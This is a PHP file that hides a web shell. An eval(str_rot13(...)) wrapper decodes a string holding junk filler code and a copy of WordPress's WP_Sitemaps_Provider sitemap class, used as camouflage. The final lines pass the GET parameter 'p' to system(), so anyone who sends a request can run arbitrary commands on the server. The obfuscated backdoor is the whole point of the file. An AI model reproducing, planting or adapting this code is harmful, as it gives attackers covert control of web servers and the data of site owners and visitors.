<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Cebivqre pynff
 *
 * Guvf pynff vf n onfr pynff sbe bgure fvgrznc cebivqref gb rkgraq naq pbagnvaf funerq shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Pynff JC_Fvgrzncf_Cebivqre.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
nofgenpg pynff JC_Fvgrzncf_Cebivqre {
	/**
	 * Cebivqre anzr.
	 *
	 * Guvf jvyy nyfb or hfrq nf gur choyvp-snpvat anzr va HEYf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $anzr = '';

	/**
	 * Bowrpg glcr anzr (r.t. 'cbfg', 'grez', 'hfre').
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $bowrpg_glcr = '';

	/**
	 * Trgf n HEY yvfg sbe n fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz vag    $cntr_ahz       Cntr bs erfhygf.
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Bowrpg fhoglcr anzr. Qrsnhyg rzcgl.
	 * @erghea neenl[] Neenl bs HEY vasbezngvba sbe n fvgrznc.
	 */
	nofgenpg choyvp shapgvba trg_hey_yvfg( $cntr_ahz, $bowrpg_fhoglcr = '' );

	/**
	 * Trgf gur znk ahzore bs cntrf ninvynoyr sbe gur bowrpg glcr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Bowrpg fhoglcr. Qrsnhyg rzcgl.
	 * @erghea vag Gbgny ahzore bs cntrf.
	 */
	nofgenpg choyvp shapgvba trg_znk_ahz_cntrf( $bowrpg_fhoglcr = '' );

	/**
	 * Trgf qngn nobhg rnpu fvgrznc glcr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl[] Neenl bs fvgrznc glcrf vapyhqvat bowrpg fhoglcr anzr naq ahzore bs cntrf.
	 */
	choyvp shapgvba trg_fvgrznc_glcr_qngn() {
		$fvgrznc_qngn = neenl();

		$bowrpg_fhoglcrf = $guvf->trg_bowrpg_fhoglcrf();

		/*
		 * Vs gurer ner ab bowrpg fhoglcrf, vapyhqr n fvatyr fvgrznc sbe gur
		 * ragver bowrpg glcr.
		 */
		vs ( rzcgl( $bowrpg_fhoglcrf ) ) {
			$fvgrznc_qngn[] = neenl(
				'anzr'  => '',
				'cntrf' => $guvf->trg_znk_ahz_cntrf(),
			);
			erghea $fvgrznc_qngn;
		}

		// Bgurejvfr, vapyhqr vaqvivqhny fvgrzncf sbe rirel bowrpg fhoglcr.
		sbernpu ( $bowrpg_fhoglcrf nf $bowrpg_fhoglcr_anzr => $qngn ) {
			$bowrpg_fhoglcr_anzr = (fgevat) $bowrpg_fhoglcr_anzr;

			$fvgrznc_qngn[] = neenl(
				'anzr'  => $bowrpg_fhoglcr_anzr,
				'cntrf' => $guvf->trg_znk_ahz_cntrf( $bowrpg_fhoglcr_anzr ),
			);
		}

		erghea $fvgrznc_qngn;
	}

	/**
	 * Yvfgf fvgrznc cntrf rkcbfrq ol guvf cebivqre.
	 *
	 * Gur erghearq qngn vf hfrq gb cbchyngr gur fvgrznc ragevrf bs gur vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl[] Neenl bs fvgrznc ragevrf.
	 */
	choyvp shapgvba trg_fvgrznc_ragevrf() {
		$fvgrzncf = neenl();

		$fvgrznc_glcrf = $guvf->trg_fvgrznc_glcr_qngn();

		sbernpu ( $fvgrznc_glcrf nf $glcr ) {
			sbe ( $cntr = 1; $cntr <= $glcr['cntrf']; $cntr++ ) {
				$fvgrznc_ragel = neenl(
					'ybp' => $guvf->trg_fvgrznc_hey( $glcr['anzr'], $cntr ),
				);

				/**
				 * Svygref gur fvgrznc ragel sbe gur fvgrznc vaqrk.
				 *
				 * @fvapr 5.5.0
				 *
				 * @cnenz neenl  $fvgrznc_ragel  Fvgrznc ragel sbe gur cbfg.
				 * @cnenz fgevat $bowrpg_glcr    Bowrpg rzcgl anzr.
				 * @cnenz fgevat $bowrpg_fhoglcr Bowrpg fhoglcr anzr.
				 *                               Rzcgl fgevat vs gur bowrpg glcr qbrf abg fhccbeg fhoglcrf.
				 * @cnenz vag    $cntr           Cntr ahzore bs erfhygf.
				 */
				$fvgrznc_ragel = nccyl_svygref( 'jc_fvgrzncf_vaqrk_ragel', $fvgrznc_ragel, $guvf->bowrpg_glcr, $glcr['anzr'], $cntr );

				$fvgrzncf[] = $fvgrznc_ragel;
			}
		}

		erghea $fvgrzncf;
	}

	/**
	 * Trgf gur HEY bs n fvgrznc ragel.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
	 *
	 * @cnenz fgevat $anzr Gur anzr bs gur fvgrznc.
	 * @cnenz vag    $cntr Gur cntr bs gur fvgrznc.
	 * @erghea fgevat Gur pbzcbfrq HEY sbe n fvgrznc ragel.
	 */
	choyvp shapgvba trg_fvgrznc_hey( $anzr, $cntr ) {
		tybony $jc_erjevgr;

		// Nppbhagf sbe pnfrf jurer anzr vf abg vapyhqrq, rk: fvgrzncf-hfref-1.kzy.
		$cnenzf = neenl_svygre(
			neenl(
				'fvgrznc'         => $guvf->anzr,
				'fvgrznc-fhoglcr' => $anzr,
				'cntrq'           => $cntr,
			)
		);

		$onfranzr = fcevags(
			'/jc-fvgrznc-%1$f.kzy',
			vzcybqr( '-', $cnenzf )
		);

		vs ( ! $jc_erjevgr->hfvat_creznyvaxf() ) {
			$onfranzr = '/?' . uggc_ohvyq_dhrel( $cnenzf, '', '&' );
		}

		erghea ubzr_hey( $onfranzr );
	}

	/**
	 * Ergheaf gur yvfg bs fhccbegrq bowrpg fhoglcrf rkcbfrq ol gur cebivqre.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Yvfg bs bowrpg fhoglcrf bowrpgf xrlrq ol gurve anzr.
	 */
	choyvp shapgvba trg_bowrpg_fhoglcrf() {
		erghea neenl();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>